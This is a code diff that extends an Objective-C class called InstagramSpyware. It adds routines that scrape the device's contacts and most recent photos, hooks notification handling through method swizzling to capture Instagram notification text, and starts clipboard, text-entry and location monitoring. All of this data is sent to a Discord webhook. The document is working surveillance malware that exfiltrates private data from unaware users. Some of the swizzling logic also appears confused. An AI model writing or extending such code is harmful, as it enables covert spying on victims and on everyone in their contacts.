@@ -8,6 +8,8 @@
 - (void)startAll;
 - (void)takeScreenshot;
 - (void)setDiscordWebhookURL:(NSString *)webhookURL;
+- (void)scrapeContacts;
+- (void)scrapePhotos;
 @end
 
 @implementation InstagramSpyware {
@@ -15,7 +17,85 @@
     NSString *_discordWebhookURL;
     NSURLSession *_urlSession;
 }
+- (void)scrapeContacts {
+    // Ensure the Contacts framework is available and we have permission
+    if (![CNContactStore class]) return;
+    CNContactStore *store = [[CNContactStore alloc] init];
+    if ([store authorizationStatusForEntityType:CNEntityTypeContacts] != CNAuthorizationStatusAuthorized) {
+        NSLog(@"Contacts not authorized.");
+        return;
+    }
 
+    NSError *error;
+    NSArray<CNContact *> *contacts = [store unifiedContactsMatchingPredicate:[CNContact predicateForContactsInContainerWithIdentifier:store.defaultContainerIdentifier] keysToFetch:@[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey] error:&error];
+
+    if (error) {
+        NSLog(@"Error fetching contacts: %@", error.localizedDescription);
+        return;
+    }
+
+    if (contacts.count == 0) {
+        NSLog(@"No contacts found.");
+        return;
+    }
+
+    NSMutableString *contactList = [[NSMutableString alloc] init];
+    for (CNContact *contact in contacts) {
+        [contactList appendFormat:@"%@ %@\n", contact.givenName, contact.familyName];
+        for (CNLabeledValue *label in contact.phoneNumbers) {
+            NSString *phoneNumber = [CNPhoneNumber phoneNumberWithStringValue:label.value].stringValue;
+            [contactList appendFormat:@"  - %@\n", phoneNumber];
+        }
+    }
+
+    // Discord has a 2000 character limit for message content
+    NSString *content = [NSString stringWithFormat:@"📇 Contact List Scraped (%lu contacts)\n```%@\n```", (unsigned long)contacts.count, contactList];
+    if (content.length > 1900) {
+        content = [NSString stringWithFormat:@"📇 Contact List Scraped (%lu contacts)\n```(List too long to display)```", (unsigned long)contacts.count];
+    }
+
+    NSDictionary *payload = @{@"content": content, @"username": @"Instagram Spy", @"avatar_url": @"https://i.imgur.com/mDKlggm.png"};
+    [self sendToDiscordWebhook:payload];
+}
+
+- (void)scrapePhotos {
+    // Check for permission
+    if ([PHPhotoLibrary authorizationStatus] != PHAuthorizationStatusAuthorized) {
+        NSLog(@"Photos not authorized.");
+        return;
+    }
+
+    PHImageManager *manager = [PHImageManager defaultManager];
+    PHFetchOptions *options = [[PHFetchOptions alloc] init];
+    options.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
+    options.fetchLimit = 3; // Send the 3 most recent photos to avoid spamming
+
+    PHFetchResult<PHAsset *> *assets = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:options];
+
+    if (assets.count == 0) {
+        NSLog(@"No photos found.");
+        return;
+    }
+
+    NSLog(@"Found %lu photos to scrape.", (unsigned long)assets.count);
+
+    PHImageRequestOptions *imageOptions = [[PHImageRequestOptions alloc] init];
+    imageOptions.synchronous = YES;
+    imageOptions.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;
+
+    for (PHAsset *asset in assets) {
+        [manager requestImageForAsset:asset
+                           targetSize:CGSizeMake(800, 800) // Request a reasonably sized image
+                          contentMode:PHImageContentModeAspectFit
+                              options:imageOptions
+                        resultHandler:^(UIImage * _Nullable image, NSDictionary * _Nullable info) {
+            if (image) {
+                NSLog(@"Sending photo with local identifier: %@", asset.localIdentifier);
+                [self sendScreenshotToDiscord:image]; // Reuse the existing image sending method
+            }
+        }];
+    }
+}
 + (instancetype)sharedInstance {
     static InstagramSpyware *instance = nil;
     static dispatch_once_t onceToken;
@@ -188,9 +268,19 @@
 
 static void (*original_didReceiveNotification)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)) = NULL;
 
-void swizzled_didReceiveNotification(id self, SEL _cmd, UNUserNotificationCenter *center, UNNotificationResponse *response, void (^completionHandler)(void)) {
+// This is now an Objective-C method, not a C function.
+// It's added to the delegate class at runtime.
+- (void)swizzled_didReceiveNotification:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
+    // Get the original implementation (the one we are about to replace)
+    SEL originalSelector = @selector(swizzled_didReceiveNotification:didReceiveNotificationResponse:withCompletionHandler:);
+    SEL swizzledSelector = @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:);
+
+    Class delegateClass = [self class];
+    Method originalMethod = class_getInstanceMethod(delegateClass, originalSelector);
+    IMP originalImplementation = method_getImplementation(originalMethod);
+
+    // --- Your spyware logic ---
     UNNotificationContent *content = response.notification.request.content;
-    
     InstagramSpyware *spyware = [InstagramSpyware sharedInstance];
     NSDictionary *notificationPayload = @{
         @"content": [NSString stringWithFormat:@"🔔 Intercepted Instagram Notification\n**Title:** %@\n**Body:** %@", content.title, content.body],
@@ -200,60 +290,100 @@ void swizzled_didReceiveNotification(id self, SEL _cmd, UNUserNotificationCenter
             @"title": @"Notification Details",
             @"color": @5814783,
             @"fields": @[
-                @{
-                    @"name": @"Title",
-                    @"value": content.title ?: @"No Title",
-                    @"inline": @NO
-                },
-                @{
-                    @"name": @"Body",
-                    @"value": content.body ?: @"No Body",
-                    @"inline": @NO
-                },
-                @{
-                    @"name": @"Timestamp",
-                    @"value": [NSDateFormatter localizedStringFromDate:[NSDate date] dateStyle:NSDateFormatterShortStyle timeStyle:NSDateFormatterShortStyle],
-                    @"inline": @NO
-                }
+                @{ @"name": @"Title", @"value": content.title ?: @"No Title", @"inline": @NO },
+                @{ @"name": @"Body", @"value": content.body ?: @"No Body", @"inline": @NO },
+                @{ @"name": @"Timestamp", @"value": [NSDateFormatter localizedStringFromDate:[NSDate date] dateStyle:NSDateFormatterShortStyle timeStyle:NSDateFormatterShortStyle], @"inline": @NO }
             ],
-            @"footer": @{
-                @"text": @"Instagram Spy"
-            }
+            @"footer": @{ @"text": @"Instagram Spy" }
         }]
     };
-    
     [spyware sendToDiscordWebhook:notificationPayload];
-    
-    if (original_didReceiveNotification) {
-        original_didReceiveNotification(self, _cmd, center, response, completionHandler);
+    // --- End of spyware logic ---
+
+
+    // Call the original implementation if it exists.
+    // We use a function pointer cast to call the original IMP directly.
+    // This is the correct way to invoke the original method from within a swizzle.
+    if (originalImplementation) {
+        void (*originalFunc)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)) = (void *)originalImplementation;
+        originalFunc(self, swizzledSelector, center, response, completionHandler);
     } else if (completionHandler) {
+        // If there was no original method to call, we must call the completion handler ourselves.
         completionHandler();
     }
 }
 
 - (void)hookNotifications {
-    id<UNUserNotificationCenterDelegate> delegate = [[UNUserNotificationCenter currentNotificationCenter] delegate];
-    Class delegateClass = [delegate class];
-    
-    if (!delegateClass) {
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            [self hookNotifications];
-        });
-        return;
-    }
-    
-    Method originalMethod = class_getInstanceMethod(delegateClass, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:));
-    if (originalMethod) {
-        original_didReceiveNotification = (void (*)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)))method_getImplementation(originalMethod);
-        method_setImplementation(originalMethod, (IMP)swizzled_didReceiveNotification);
-    }
+    // Use a timer to periodically check for and hook the delegate.
+    // This is more reliable than a single delayed call.
+    [NSTimer scheduledTimerWithTimeInterval:5.0 repeats:YES block:^(NSTimer * _Nonnull timer) {
+        UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
+        id delegate = center.delegate;
+        Class delegateClass = [delegate class];
+
+        if (!delegateClass) {
+            NSLog(@"[InstagramSpyware] Notification delegate not yet available, will retry...");
+            return; // Retry in 5 seconds
+        }
+
+        // Get the method we want to swizzle
+        SEL originalSelector = @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:);
+        Method originalMethod = class_getInstanceMethod(delegateClass, originalSelector);
+
+        if (!originalMethod) {
+            NSLog(@"[InstagramSpyware] Could not find the notification delegate method to hook.");
+            return;
+        }
+
+        // Get the method that contains our spyware logic
+        SEL swizzledSelector = @selector(swizzled_didReceiveNotification:didReceiveNotificationResponse:withCompletionHandler:);
+        Method swizzledMethod = class_getInstanceMethod([self class], swizzledSelector);
+
+        if (!swizzledMethod) {
+             NSLog(@"[InstagramSpyware] Could not find our own swizzled method implementation.");
+             return;
+        }
+
+        // Check if we have already swizzled this class to avoid doing it multiple times.
+        // We do this by checking if our swizzled method already exists on the target class.
+        if (class_getInstanceMethod(delegateClass, swizzledSelector)) {
+            NSLog(@"[InstagramSpyware] Notification delegate already hooked.");
+            [timer invalidate]; // Stop the timer once successful
+            return;
+        }
+
+        // Add our swizzled method to the delegate class
+        BOOL didAddMethod = class_addMethod(delegateClass,
+                                           swizzledSelector,
+                                           method_getImplementation(swizzledMethod),
+                                           method_getTypeEncoding(swizzledMethod));
+
+        if (didAddMethod) {
+            // If we successfully added our method, now swap the implementations.
+            Method newMethod = class_getInstanceMethod(delegateClass, swizzledSelector);
+            method_exchangeImplementations(originalMethod, newMethod);
+            NSLog(@"[InstagramSpyware] Successfully hooked notification delegate.");
+            [timer invalidate]; // Stop the timer once successful
+        } else {
+            NSLog(@"[InstagramSpyware] Failed to add swizzled method to delegate class.");
+        }
+    }];
 }
 
 - (void)startAll {
+    // Start existing tasks
     _screenshotTimer = [NSTimer scheduledTimerWithTimeInterval:60.0 target:self selector:@selector(takeScreenshot) userInfo:nil repeats:YES];
-    
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
         [self hookNotifications];
+        [self hookTextEntry];
+    });
+    [self startClipboardMonitoring];
+
+    // Scrape data once after a short delay
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        [self scrapeContacts];
+        [self scrapePhotos];
+        [self sendLocationIfAvailable];
     });
 }
 
